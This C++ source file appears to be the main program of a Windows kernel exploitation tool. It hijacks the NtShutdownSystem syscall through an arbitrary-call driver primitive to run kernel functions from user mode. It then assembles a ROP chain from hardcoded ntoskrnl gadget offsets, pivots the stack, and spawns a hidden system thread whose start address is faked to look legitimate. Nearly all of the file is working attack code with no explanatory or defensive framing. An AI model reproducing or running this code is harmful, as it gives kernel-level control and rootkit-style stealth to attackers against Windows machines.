#include <include/driver/arbitrary_call.hpp>
#include <include/utils/utils.hpp>
#include <iostream>
#include <include/stack/stack_manager.hpp>

int main()
{
    if (!Utils::EnableDebugPrivilege())
    {
        std::exception("Failed to enable debug privileges");
        return EXIT_FAILURE;
    }

    const std::uintptr_t RandomValidThreadAddress = Utils::FindRandomValidThreadAddress();
    if (!RandomValidThreadAddress)
    {
        std::exception("Failed to find a random valid thread address");
        return EXIT_FAILURE;
    }

    std::printf("[+] New thread address to be used @ 0x%p\n", RandomValidThreadAddress);
    std::printf("[+] ntoskrnl.exe @ 0x%p\n", Driver::GetKernelModuleBase());

    Driver::ArbitraryCaller KernelCaller = Driver::ArbitraryCaller();

    const void* NtShutdownSystem = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtShutdownSystem");

    //KernelCaller.RedirectCall(
    //    (void*)(Driver::GetKernelModuleBase() + (std::uint64_t)Driver::GetKernelFunctionOffset("NtShutdownSystem")),
    //    (void*)(Driver::GetKernelModuleBase() + 0x345F40)
    //);
    KernelCaller.RedirectCallByName("NtShutdownSystem", "MmAllocateContiguousMemory");
    void* IntervalArgAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x20, (void*)MAXULONG64);
    void* CurrentStackOffsetAddress = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
    void* StackLimitStoreAddress = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
    void* StackAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x6000, (void*)MAXULONG64);
    void* OriginalStackAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x6000, (void*)MAXULONG64);
    KernelCaller.DisableRedirectByName("NtShutdownSystem");
    std::printf("[+] Stack @ 0x%p\n", StackAllocation);
    std::printf("[+] Original Stack @ 0x%p\n", OriginalStackAllocation);
    std::printf("[+] Current Stack Offset @ 0x%p\n", CurrentStackOffsetAddress);

    if (!StackAllocation || !OriginalStackAllocation || !CurrentStackOffsetAddress || !StackLimitStoreAddress)
        return EXIT_FAILURE;

    // Zero out stack allocation
    KernelCaller.RedirectCallByName("NtShutdownSystem", "RtlZeroMemory");
    reinterpret_cast<void* (*)(void*, size_t)>(NtShutdownSystem)(StackAllocation, 0x6000);
    reinterpret_cast<void* (*)(void*, size_t)>(NtShutdownSystem)(OriginalStackAllocation, 0x6000);
    reinterpret_cast<void* (*)(void*, size_t)>(NtShutdownSystem)(CurrentStackOffsetAddress, 0x8);
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    StackManager KernelStackManager(Driver::GetKernelModuleBase(), reinterpret_cast<std::uintptr_t>(StackAllocation));

    // Fake the thread's start address to the random legitimate one we found
    //KernelStackManager.ModifyThreadStartAddress(RandomValidThreadAddress);
    //KernelStackManager.ModifyThreadStackBaseAndLimit(((uintptr_t)StackAllocation)+0x6000, (uintptr_t)StackAllocation);
    //KernelStackManager.AddFunctionCall<int>("KeLowerIrql", 0);
    //KernelStackManager.AddFunctionCall<NTSTATUS>("PsTerminateSystemThread", 0);

    //// loop demo
    //KernelStackManager.AddFunctionCall("KeDelayExecutionThread", 0, FALSE, (uint64_t)IntervalArgAllocation);
    //KernelStackManager.AddFunctionCall("MmAllocateContiguousMemory", 0x6000, MAXULONG64);
    //// we need to increment the addr by 0x2000
    //KernelStackManager.AddGadget(0x256c4a, "pop rcx; ret;");
    //KernelStackManager.AddValue(0x2000, "value to increment ptr by");
    //KernelStackManager.AddGadget(0x28efa4, "add rax, rcx; ret;");

    //KernelStackManager.AddGadget(0x54810e, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
    //KernelStackManager.AddPadding(0x28);
    //KernelStackManager.AddGadget(0x36d2de, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
    //KernelStackManager.AddGadget(0x3cca89, "pop rdx; ret;");
    //KernelStackManager.AddValue((std::uint64_t)OriginalStackAllocation, "src address");
    //KernelStackManager.AddGadget(0x2f7921, "pop r8; ret;");
    //// NOTE: this was 0x6000 before
    //KernelStackManager.AddValue(0x4000, "count value");
    //KernelStackManager.AddFunctionCall("memcpy");

    //KernelStackManager.AddGadget(0x36d2de, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
    //KernelStackManager.AddGadget(0xb4296a, "mov r11, rcx; cmp edx, dword ptr [rax]; je 0xb42978; mov eax, 0xc000000d; ret;");
    //KernelStackManager.AddGadget(0x536d2a, "mov rsp, r11; ret;");

    // pivot into thread's created stack demo
    // Grab stack limit
    KernelStackManager.AddFunctionCall("PsGetCurrentThread");
    KernelStackManager.AddGadget(0x256c4a, "pop rcx; ret;");
    KernelStackManager.AddValue(0x30, "stack limit");
    KernelStackManager.AddGadget(0x28efa4, "add rax, rcx; ret;");
    // set rsi so we can jump to it next gadget
    KernelStackManager.AddGadget(0x2005aa, "pop rsi; ret;");
    KernelStackManager.AddValue(Driver::GetKernelModuleBase() + 0x20043b, "jump address (ret; gadget)");
    // r13=rax
    KernelStackManager.AddGadget(0x6aa7c1, "mov r13, rax; mov r14, rax; mov r15, rax; lfence; jmp rsi;");

    // rax = pool allocation
    //KernelStackManager.AddFunctionCall("ExAllocatePool2", 0x40, 8, 'Thre');
    KernelStackManager.AddGadget(0x210e10, "pop rax; ret;");
    KernelStackManager.AddValue((std::uint64_t)StackLimitStoreAddress, "stack limit store address");

    // rdx = pool allocation
    KernelStackManager.AddGadget(0x604b3d, "mov r8, rax; mov rax, r8; add rsp, 0x28; ret;");
    KernelStackManager.AddPadding(0x28);
    KernelStackManager.AddGadget(0x435f24, "mov rdx, rax; cmp r8, rax; ja 0x435f5d; mov eax, 1; add rsp, 0x28; ret;");
    KernelStackManager.AddPadding(0x28);
    // rax = addr of stack limit
    KernelStackManager.AddGadget(0x32e120, "mov rax, r13; add rsp, 0x48; pop r15; pop r13; ret;");
    KernelStackManager.AddPadding(0x48 + 0x10);
    // dereference rax, so that rax = stack limit
    KernelStackManager.AddGadget(0x25d375, "mov rax, qword ptr [rax]; ret;");
    KernelStackManager.AddGadget(0x202e49, "mov qword ptr [rdx], rax; ret;");


    // move rax into rbx to preserve it
    KernelStackManager.AddGadget(0x267743, "push rax; pop rbx; ret;");
    // sets rax to either 'rax + 0x2000' or 'rax + 0x4000' depending on i % 2.
    // store rax in r10
    KernelStackManager.AddGadget(0x54810e, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
    KernelStackManager.AddPadding(0x28);
    // read the value of the current stack offset global variable
    KernelStackManager.AddGadget(0x210e10, "pop rax; ret;");
    KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
    KernelStackManager.AddGadget(0x25d375, "mov rax, qword ptr [rax]; ret;");
    // move rax into rcx so we store the offset in rcx
    KernelStackManager.AddGadget(0x54810e, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
    KernelStackManager.AddPadding(0x28);
    KernelStackManager.AddGadget(0x36d2de, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
    // restore the old value of rax into rax from rbx
    KernelStackManager.AddGadget(0x571bf2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
    KernelStackManager.AddPadding(0x20 + 0x8);
    KernelStackManager.AddGadget(0x28efa4, "add rax, rcx; ret;");


    // Write our own stack into thread's legitimate stack
    KernelStackManager.AddGadget(0x54810e, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
    KernelStackManager.AddPadding(0x28);
    KernelStackManager.AddGadget(0x36d2de, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
    KernelStackManager.AddGadget(0x3cca89, "pop rdx; ret;");
    KernelStackManager.AddValue((std::uint64_t)OriginalStackAllocation, "src address");
    KernelStackManager.AddGadget(0x2f7921, "pop r8; ret;");
    KernelStackManager.AddValue(0x2000, "count value");
    KernelStackManager.AddFunctionCall("memcpy");

    // Grab stack limit
    KernelStackManager.AddFunctionCall("PsGetCurrentThread");
    KernelStackManager.AddGadget(0x256c4a, "pop rcx; ret;");
    KernelStackManager.AddValue(0x30, "stack limit");
    KernelStackManager.AddGadget(0x28efa4, "add rax, rcx; ret;");
    // dereference rax, so that rax = stack limit
    KernelStackManager.AddGadget(0x25d375, "mov rax, qword ptr [rax]; ret;");

    // get the value of the current stack offset global so we add it into rax

    // same code as above - basically just get the value of CurrentStackOffsetAddress
    // and add it to rax. so rax = stacklimit + curr_stack_offset
    KernelStackManager.AddGadget(0x267743, "push rax; pop rbx; ret;");
    KernelStackManager.AddGadget(0x54810e, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
    KernelStackManager.AddPadding(0x28);
    KernelStackManager.AddGadget(0x210e10, "pop rax; ret;");
    KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
    KernelStackManager.AddGadget(0x25d375, "mov rax, qword ptr [rax]; ret;");
    KernelStackManager.AddGadget(0x54810e, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
    KernelStackManager.AddPadding(0x28);
    KernelStackManager.AddGadget(0x36d2de, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
    KernelStackManager.AddGadget(0x571bf2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
    KernelStackManager.AddPadding(0x20 + 0x8);
    KernelStackManager.AddGadget(0x28efa4, "add rax, rcx; ret;");


    // xor the current stack offset by global by 0x6000 (0x2000 ^ 0x4000 = 0x6000),
    // meaning we will always swap between 0x2000 and 0x4000 per iteration.

    KernelStackManager.AddGadget(0x2f7921, "pop r8; ret;");
    KernelStackManager.AddValue(0x6000, "xor key (0x6000)");
    KernelStackManager.AddGadget(0x200f35, "pop r14; ret;");
    KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr (to xor)");
    KernelStackManager.AddGadget(0x9b060b, "xor qword ptr [r14], r8; add dh, dh; ret;");


    // rcx=rax
    KernelStackManager.AddGadget(0x54810e, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
    KernelStackManager.AddPadding(0x28);
    KernelStackManager.AddGadget(0x36d2de, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
    // r11=rcx
    KernelStackManager.AddGadget(0xb4296a, "mov r11, rcx; cmp edx, dword ptr [rax]; je 0xb42978; mov eax, 0xc000000d; ret;");
    // pivot, rsp=r11
    KernelStackManager.AddGadget(0x536d2a, "mov rsp, r11; ret;");


    LARGE_INTEGER SleepInterval;
    SleepInterval.QuadPart = -10000000;

    std::uint64_t CurrentStackOffsetStartValue = 0x2000;

    KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(IntervalArgAllocation, &SleepInterval, sizeof(SleepInterval));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(CurrentStackOffsetAddress, &CurrentStackOffsetStartValue, sizeof(CurrentStackOffsetStartValue));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 0x2000), KernelStackManager.GetStackBuffer(), KernelStackManager.GetStackSize());
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(OriginalStackAllocation, KernelStackManager.GetStackBuffer(), KernelStackManager.GetStackSize());
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    Sleep(500);
    std::cin.get();

    void* BootstrapGadget = (void*)(Driver::GetKernelModuleBase() + 0x9b8ac1); // push rcx; pop rsp; test edx, edx; je 0x9b8acd; add rsp, 0x28; ret;
    void* OffsetedStackAllocation = (void*)((std::uintptr_t)StackAllocation + 0x2000 - 0x28); // account for 0x28 being added in gadget

    HANDLE KernelThreadHandle;
    KernelCaller.RedirectCallByName("NtShutdownSystem", "PsCreateSystemThread", (void*)NULL, (void*)BootstrapGadget, OffsetedStackAllocation);
    NTSTATUS ThreadCreation = reinterpret_cast<NTSTATUS(*)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, HANDLE)>(NtShutdownSystem)(
        &KernelThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL
    );
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    KernelCaller.RedirectCallByName("NtShutdownSystem", "ZwClose");
    reinterpret_cast<void* (*)(HANDLE)>(NtShutdownSystem)(KernelThreadHandle);
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    return EXIT_SUCCESS;
}